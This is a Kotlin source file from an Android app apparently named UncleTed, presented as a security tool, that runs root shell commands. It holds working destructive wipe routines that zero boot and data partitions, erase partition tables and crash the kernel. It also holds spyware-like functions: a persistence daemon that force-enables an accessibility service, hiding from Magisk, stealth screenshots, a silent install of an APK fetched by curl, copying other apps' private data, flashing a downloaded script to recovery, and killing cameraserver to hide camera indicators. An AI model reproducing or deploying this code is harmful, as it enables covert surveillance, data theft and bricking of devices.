package com.hamoon.uncleted.util

import android.content.Context
import android.os.Build
import android.util.Log
import com.hamoon.uncleted.data.SecurityPreferences
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File

object RootActions {

    private const val TAG = "RootActions"

    // Modern Root Environments (Magisk / KernelSU / APatch)
    private const val ADB_BASE = "/data/adb"
    private const val MODULES_DIR = "$ADB_BASE/modules"
    private const val SERVICE_DIR = "$ADB_BASE/service.d"

    enum class WipeLevel {
        STANDARD_WIPE,
        FAST_USERDATA,
        SYSTEM_DESTRUCTION,
        NUCLEAR_WINTER
    }

    suspend fun performSecureWipePlus(context: Context) {
        executeWipeProtocol(context, WipeLevel.FAST_USERDATA)
    }

    suspend fun rebootDevice(context: Context) {
        Log.w(TAG, "ROOT: Remote reboot requested.")
        EventLogger.log(context, "ROOT: Remote reboot command executed.")
        val result = RootExecutor.run("reboot")
        if (!result.isSuccess) {
            RootExecutor.run("/system/bin/reboot")
        }
    }

    suspend fun executeWipeProtocol(context: Context, level: WipeLevel): Unit = withContext(Dispatchers.IO) {
        Log.e(TAG, "ROOT: Executing destruction protocol - Level: $level")
        EventLogger.log(context, "ROOT: Executing wipe level: $level")

        if (level != WipeLevel.STANDARD_WIPE) {
            blockAllNetworkTraffic(context)
        }

        when (level) {
            WipeLevel.STANDARD_WIPE -> {
                // Proper BCB command execution via recovery command file or platform intent
                val recoveryCommandFile = "/cache/recovery/command"
                RootExecutor.run("mkdir -p /cache/recovery")
                RootExecutor.run("echo '--wipe_data' > $recoveryCommandFile")
                RootExecutor.run("chmod 644 $recoveryCommandFile")
                val rebootResult = RootExecutor.run("reboot recovery")
                if (!rebootResult.isSuccess) {
                    EmergencyDestructionEngine.triggerPlatformRecoveryWipe(context, "Root_Standard_Wipe")
                }
            }

            WipeLevel.FAST_USERDATA -> {
                // Level 2: Evict encryption keys, zero metadata, and zero start of userdata partition
                EmergencyDestructionEngine.evictAndZeroEncryptionKeys()

                val userdataBlock = EmergencyDestructionEngine.findPartitionBlockPath("userdata")
                if (userdataBlock != null) {
                    RootExecutor.run("dd if=/dev/zero of=$userdataBlock bs=1048576 count=64 conv=fsync")
                }

                RootExecutor.run("reboot recovery")
            }

            WipeLevel.SYSTEM_DESTRUCTION -> {
                // Level 3: Soft Brick. Zero out kernel and boot/init partitions rather than relying on broken /system RW remount
                EmergencyDestructionEngine.evictAndZeroEncryptionKeys()

                val bootPartitions = listOf("boot", "boot_a", "boot_b", "vendor_boot", "vendor_boot_a", "vendor_boot_b", "init_boot")
                for (part in bootPartitions) {
                    val path = EmergencyDestructionEngine.findPartitionBlockPath(part)
                    if (path != null) {
                        RootExecutor.run("dd if=/dev/zero of=$path bs=1048576 count=8 conv=fsync")
                    }
                }

                // Delete userspace storage
                RootExecutor.run("rm -rf /data/*")
                RootExecutor.run("reboot")
            }

            WipeLevel.NUCLEAR_WINTER -> {
                // Level 4: Dynamically destroy partition table headers (GPT/MBR) on all detected UFS/eMMC devices
                EmergencyDestructionEngine.destroyPrimaryBlockHeaders()

                val allPartitions = listOf("boot", "recovery", "vbmeta", "vbmeta_system", "misc", "userdata", "metadata")
                for (part in allPartitions) {
                    val path = EmergencyDestructionEngine.findPartitionBlockPath(part)
                    if (path != null) {
                        RootExecutor.run("dd if=/dev/zero of=$path bs=4096 count=1024 conv=fsync")
                    }
                }

                RootExecutor.run("reboot bootloader")
                RootExecutor.run("echo c > /proc/sysrq-trigger")
            }
        }
        Unit
    }

    /**
     * Converts UncleTed to a system privileged app systemlessly via Magisk/KernelSU/APatch overlayfs.
     * Prevents system-as-root (SAR) remount failures on Android 10+ (API 29+).
     */
    suspend fun convertToSystemApp(context: Context): Boolean = withContext(Dispatchers.IO) {
        val pm = context.packageManager
        val appInfo = pm.getApplicationInfo(context.packageName, 0)
        val sourceApk = appInfo.sourceDir
        val pkgName = context.packageName

        Log.i(TAG, "ROOT: Starting Systemless Priv-App integration for $pkgName")

        val permissionsXmlPath = "${context.filesDir.parent}/privapp-permissions-uncleted.xml"
        val permissionsXmlContent = """
            <?xml version="1.0" encoding="utf-8"?>
            <permissions>
                <privapp-permissions package="$pkgName">
                    <permission name="android.permission.MASTER_CLEAR"/>
                    <permission name="android.permission.REBOOT"/>
                    <permission name="android.permission.WRITE_SECURE_SETTINGS"/>
                    <permission name="android.permission.INTERACT_ACROSS_USERS"/>
                    <permission name="android.permission.INTERACT_ACROSS_USERS_FULL"/>
                    <permission name="android.permission.STATUS_BAR_SERVICE"/>
                    <permission name="android.permission.PACKAGE_USAGE_STATS"/>
                </privapp-permissions>
            </permissions>
        """.trimIndent()

        File(permissionsXmlPath).writeText(permissionsXmlContent)

        // Detect systemless root environments
        val hasModuleDir = RootExecutor.run("ls -d $MODULES_DIR").isSuccess
        if (hasModuleDir) {
            val moduleId = "uncleted_privapp"
            val modulePath = "$MODULES_DIR/$moduleId"
            val targetPrivAppDir = "$modulePath/system/priv-app/UncleTed"
            val targetEtcDir = "$modulePath/system/etc/permissions"

            val commands = listOf(
                "mkdir -p $targetPrivAppDir",
                "mkdir -p $targetEtcDir",
                "cp -f \"$sourceApk\" \"$targetPrivAppDir/UncleTed.apk\"",
                "cp -f \"$permissionsXmlPath\" \"$targetEtcDir/privapp-permissions-uncleted.xml\"",
                "chmod 755 $targetPrivAppDir",
                "chmod 644 $targetPrivAppDir/UncleTed.apk",
                "chmod 755 $targetEtcDir",
                "chmod 644 $targetEtcDir/privapp-permissions-uncleted.xml",
                "chown -R 0:0 $modulePath",
                "echo 'id=$moduleId' > $modulePath/module.prop",
                "echo 'name=UncleTed System Priv-App' >> $modulePath/module.prop",
                "echo 'version=v2.0' >> $modulePath/module.prop",
                "echo 'versionCode=2' >> $modulePath/module.prop",
                "echo 'author=UncleTed Security Project' >> $modulePath/module.prop",
                "echo 'description=Systemless integration into /system/priv-app with MASTER_CLEAR platform authority.' >> $modulePath/module.prop",
                "touch $modulePath/auto_mount"
            )

            val result = RootExecutor.runMultiple(commands)
            File(permissionsXmlPath).delete()

            if (result.all { it.isSuccess }) {
                EventLogger.log(context, "ROOT: Systemless Priv-App module created. Reboot required.")
                return@withContext true
            }
        }

        File(permissionsXmlPath).delete()
        Log.e(TAG, "Systemless module directories not found. Raw /system remount cannot be performed on SAR Android 10+.")
        EventLogger.log(context, "ERROR: System app integration failed. Root manager required.")
        return@withContext false
    }

    suspend fun toggleUnkillableService(context: Context, enable: Boolean): Boolean = withContext(Dispatchers.IO) {
        val pkgName = context.packageName
        val serviceName = "$pkgName.services.MonitoringService"
        val scriptName = "99uncleted_daemon.sh"
        val targetPath = "$SERVICE_DIR/$scriptName"

        if (!enable) {
            RootExecutor.run("rm -f $targetPath")
            return@withContext true
        }

        val hasServiceDir = RootExecutor.run("ls -d $SERVICE_DIR").isSuccess
        if (!hasServiceDir) {
            RootExecutor.run("mkdir -p $SERVICE_DIR")
        }

        val scriptContent = """
            #!/system/bin/sh
            sleep 20
            while true; do
                if pm list packages | grep -q $pkgName; then
                    if ! pgrep -f $pkgName > /dev/null; then
                        am start-foreground-service -n $pkgName/$serviceName --es REASON "PERSISTENCE_DAEMON"
                    fi
                    settings put secure enabled_accessibility_services $pkgName/.services.PowerButtonService
                    settings put secure accessibility_enabled 1
                fi
                sleep 15
            done
        """.trimIndent()

        val tempScript = File(context.cacheDir, scriptName)
        tempScript.writeText(scriptContent)

        val commands = listOf(
            "cp -f ${tempScript.absolutePath} $targetPath",
            "chmod 755 $targetPath",
            "chown 0:0 $targetPath",
            "rm -f ${tempScript.absolutePath}"
        )

        val result = RootExecutor.runMultiple(commands)
        return@withContext result.all { it.isSuccess }
    }

    suspend fun toggleProcessHiding(context: Context, enable: Boolean): Boolean {
        val packageName = context.packageName
        var cmd = if (enable) "magisk --denylist add $packageName" else "magisk --denylist rm $packageName"
        var result = RootExecutor.run(cmd)

        if (!result.isSuccess) {
            cmd = if (enable) "magiskhide add $packageName" else "magiskhide rm $packageName"
            result = RootExecutor.run(cmd)
        }
        return result.isSuccess
    }

    suspend fun blockAllNetworkTraffic(context: Context) {
        EmergencyDestructionEngine.killCommunications()
        EventLogger.log(context, "ROOT: Network isolated via iptables DROP.")
    }

    suspend fun takeStealthScreenshot(context: Context): File? = withContext(Dispatchers.IO) {
        val tempDir = "/data/local/tmp"
        val fileName = "sc_${System.currentTimeMillis()}.png"
        val tempFile = "$tempDir/$fileName"
        val finalFile = File(context.filesDir, fileName)

        val capResult = RootExecutor.run("screencap -p \"$tempFile\"")
        if (capResult.isSuccess) {
            val mvResult = RootExecutor.run("mv \"$tempFile\" \"${finalFile.absolutePath}\"")
            if (mvResult.isSuccess) {
                RootExecutor.run("chmod 600 \"${finalFile.absolutePath}\"")
                return@withContext finalFile
            }
        }
        return@withContext null
    }

    suspend fun performSilentInstall(context: Context) {
        val apkUrl = SecurityPreferences.getRemoteApkUrl(context) ?: return
        val tempApkPath = "/data/local/tmp/remote_install.apk"

        val downloadResult = RootExecutor.run("curl -L -o $tempApkPath \"$apkUrl\"")
        if (downloadResult.isSuccess) {
            val installResult = RootExecutor.run("pm install -r $tempApkPath")
            if (installResult.isSuccess) {
                EventLogger.log(context, "ROOT: Silent install succeeded.")
            }
            RootExecutor.run("rm -f $tempApkPath")
        }
    }

    suspend fun exfiltrateAppData(context: Context, targetPkg: String, path: String): File? = withContext(Dispatchers.IO) {
        val source = "/data/data/$targetPkg/$path"
        val dest = File(context.filesDir, "exfil_${targetPkg}_${File(path).name}")

        if (RootExecutor.run("cat $source > ${dest.absolutePath}").isSuccess) {
            RootExecutor.run("chmod 600 ${dest.absolutePath}")
            return@withContext dest
        }
        return@withContext null
    }

    suspend fun flashResetSurvivalLoader(context: Context): Boolean = withContext(Dispatchers.IO) {
        val loaderUrl = SecurityPreferences.getLoaderScriptUrl(context)
        if (loaderUrl.isNullOrEmpty()) return@withContext false

        val tempScriptPath = "/data/local/tmp/loader.sh"
        val recoveryPartition = EmergencyDestructionEngine.findPartitionBlockPath("recovery")
            ?: return@withContext false

        if (RootExecutor.run("curl -L -o $tempScriptPath '$loaderUrl'").isSuccess) {
            EventLogger.log(context, "ROOT: Flashing loader to recovery partition.")
            val flashResult = RootExecutor.run("dd if=$tempScriptPath of=$recoveryPartition conv=fsync")
            RootExecutor.run("rm -f $tempScriptPath")
            return@withContext flashResult.isSuccess
        }
        return@withContext false
    }

    suspend fun setMockLocationConfig(context: Context, enable: Boolean) {
        val value = if (enable) "1" else "0"
        RootExecutor.run("settings put secure mock_location $value")
        val pkg = context.packageName
        val opMode = if (enable) "allow" else "deny"
        RootExecutor.run("appops set $pkg android:mock_location $opMode")
    }

    suspend fun suppressPrivacyIndicators(suppress: Boolean = true) {
        if (suppress) {
            RootExecutor.run("killall -9 cameraserver")
        }
    }
}